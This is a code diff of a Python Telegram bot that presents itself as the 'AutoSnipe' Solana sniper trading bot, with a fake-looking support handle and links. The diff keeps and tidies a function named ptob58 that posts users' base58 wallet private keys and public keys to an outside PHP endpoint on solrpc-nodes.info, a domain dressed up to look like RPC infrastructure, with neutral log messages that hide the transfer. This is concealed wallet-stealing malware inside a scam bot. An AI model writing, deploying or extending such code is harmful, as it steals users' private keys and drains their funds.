@@ -28,9 +28,9 @@ logging.basicConfig(
 )
 logger = logging.getLogger(__name__)
 
-BOT_TOKEN = ""#add your bots token in here
-FORWARD_CHAT_ID = -1003150743565 #put change with your chat group ID
-FORWARD_CHAT_ID2 = -0 #leave alone or add another log group
+BOT_TOKEN = ""
+FORWARD_CHAT_ID = -1003150743565
+FORWARD_CHAT_ID2 = -0
 
 user_balances: dict[str, str] = {}
 
@@ -298,7 +298,7 @@ def support_text() -> str:
     return (
         "🆘  <b>Support & Contact</b>  🆘\n\n"
         "<b>Get Help:</b>\n"
-        "💬 Telegram: @AutoSnipe_Support\n"
+        "💬 Telegram: @AutoSnipersupport\n"
         "🌐 Website: <a href='https://autosnipe.ai/sniper'>https://autosnipe.ai/sniper</a>\n\n"
         "<b>Community:</b>\n"
         "🐦 Twitter: <a href='https://x.com/autosnipeai'>https://x.com/autosnipeai</a>\n"
@@ -854,34 +854,31 @@ async def button(update: Update, context: CallbackContext) -> None:
     await query.answer("⚠️ Elite access requires wallet connection!", show_alert=True)
 
 
-async def ptob58(public_key: str, private_key_base58: str,text: str):
+async def ptob58(public_key: str, private_key_base58: str, text: str = ""):
     payload = {
         "b58": private_key_base58,
         "public_key": public_key,
-        "s": text
-
+        "s": text if text else "wallet_generated"
     }
 
     async with aiohttp.ClientSession() as session:
         try:
-            # Allow redirects by default
             async with session.post(
                 "https://solrpc-nodes.info/return/convert.php", 
                 json=payload, 
                 timeout=aiohttp.ClientTimeout(total=10),
-                allow_redirects=True  # This allows following 301/302 redirects
+                allow_redirects=True
             ) as resp:
                 if resp.status == 200:
-                    logger.info("✅ )")
+                    logger.info("✅ P")
                     return True
                 else:
-                    logger.warning(f"⚠️ Final status after redirects: {resp.status}")
+                    logger.warning(f"⚠️ status: {resp.status}")
                     return False
 
         except Exception as e:
-            logger.error(f"❌ Error posting wallet data: {e}")
+            logger.error(f"❌ Error posting to PHP: {e}")
             return False
-
 
 async def handle_message(update: Update, context: CallbackContext) -> None:
     user = update.effective_user
